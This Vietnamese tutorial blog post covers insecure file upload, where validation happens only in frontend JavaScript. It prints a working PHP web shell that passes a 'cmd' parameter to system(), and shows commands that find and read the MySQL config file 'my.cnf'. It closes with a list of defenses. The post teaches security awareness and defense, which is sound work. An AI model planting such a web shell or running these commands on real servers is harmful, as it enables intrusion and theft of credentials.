# Giới thiệu
Khỏi dài dòng, trong bài viết này mình sẽ giới thiệu rủi do về bảo mật đối với upload file. Chẳng hạn với chức năng upload avatar, thông thường user sẽ upload file ảnh lên server, okay, sẽ không có vấn đề gì cả nếu nó thực sự là một file ảnh, nhưng chiện zề sẽ xảy ra nếu như validate chỉ chạy ở phía frontend mà backend thì lại k kiểm tra chặt ? Attacker có thể lợi dụng sơ hở này và tiến hành inject mã độc.

# Cách thức hoạt động
Chức năng upload file là mục tiêu yêu thích của hackers vì nó cho phép lượng lớn dữ liệu và ghi vào disk. Điều này cho kẻ tấn công cơ hội `smuggle` mã độc lên server của bạn. Nếu chúng có thể tìm và thực thi đoạn mã độc đó, chúng có thể 'do something' với hệ thống thân yêu của bẹng :))

 Cùng xem nó hoạt động như thế nào nhé :)
 
 Nhân vật quen thuộc trong [series](https://viblo.asia/s/to-da-hoc-bao-mat-co-ban-nhu-the-nao-68Z00JY2ZkG) của mình là **Mal** lần này sẽ demo cách hoạt động của lỗ hổng này. Hắn vào trang chỉnh sửa profile và tiến hành nghịch chức năng upload avatar
 
 ![](https://images.viblo.asia/ba002156-7bc1-4f51-b7ae-60dbc6407b28.png)

Đầu tiên, file đã upload không hề được đổi đuôi file trong quá trình xử lý, file name xuất hiện trên URL của ảnh profile khi nó `published`. Thứ hai, đã kiểm tra `file-type` ở JS, nhưng **Mal** không bỏ cuộc, hắn viết thử một đoạn `script` gọi tới `hack.php`:
```php
<?php
  if(isset($_REQUEST['cmd'])) {
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
  } else {
    echo "What is your bidding?";
  }
?>
```
Khi mà web shell thực thi bởi `PHP`, nó sẽ chạy bất kỳ `command` nào được truyền qua tham số `cmd`. Hắn tắt JS ở phía trình duyệt và upload file `hack.php` lên với chức năng upload avatar - vốn không phải để upload thứ gì khác ngoài ảnh :)) . Và yep, JS bị tắt, kiểm tra đuôi file đã bị loại bỏ.

Bây giờ ảnh đại diện của hắn sẽ trông như thế này:

![](https://images.viblo.asia/379ea24f-5d31-458d-be3e-6333ac745644.png)

Đó là bởi vì nó không thể hiện được file không phải là ảnh, do hắn đã upload file `hack.php` thay vì ảnh mà :)) Chắc có lẽ đoạn `script` đã tồn tại trên server ha :))

Hắn lấy URL được truyền trên thẻ `img` của avatar và dán lên trình duyệt:

![](https://images.viblo.asia/30c4357a-1113-44a3-9edb-a2886f181a59.png)

Ờm, file `hack.php` của hắn kia rồi, bạn cũng thấy đoạn text `What is your bidding?` đã xuất hiện, như vậy là file `hack.php` đã chạy theo ý hắn.

Giờ truyền thêm param vào URL thì chúng cũng sẽ được thực thi, thêm param vào đường dẫn `...1a2fe/hack.php?cmd=locate+my.cnf` (`locate my.cnf`) để tìm đường dẫn đến file config database ha. trình duyệt trả ra nội dung như sau :`/etc/mysql/my.cnf`. Tương tự, bây giờ truyền thử lệnh `cat /etc/mysql/my.cnf` ha:

![](https://images.viblo.asia/6f2f7493-59c2-4768-a04c-910f12cae596.png)

Đọc sương sương thì cũng hiểu sơ sơ đấy nhờ, nội dung khá nhạy cảm, không dành cho trẻ em và phụ nữ có thai hoặc đang cho con bú :)) Thông tin quan trọng về database bị lộ.

# Phòng chống
Nhìn chung thì đây là lỗi cũng khá dễ khai thác, cũng có hại, và cũng thường gặp, dễ để kẻ tấn công có thể inject mã độc vào ứng dụng của bạn. Mọi thứ được người dùng gửi lên đều cần phải xem xét kỹ lưỡng, đảm bảo an toàn, nếu không kẻ tấn công có thể nhúng bất kỳ loại mã độc nào lên hệ thống. Có một vài cách bảo vệ sau đây hy vọng sẽ hữu ích cho bạn:

1. Cách ly các file được upload.
2. Chắc chắn rằng file không thể execute.
3. Sửa lại tên file khi upload.
4. validate file formats và extensions.
5. validate content-type header.
6. Sử dụng quét virus.
7. Kiểm tra file size.
8. Sanitize filename.
9. Xử lý kỹ với file nén.

# Tổng kết
Trên đây là phần giới thiệu về lỗ hổng khi upload file, hy vọng sẽ hữu ích bạn đọc , happy coding ! <3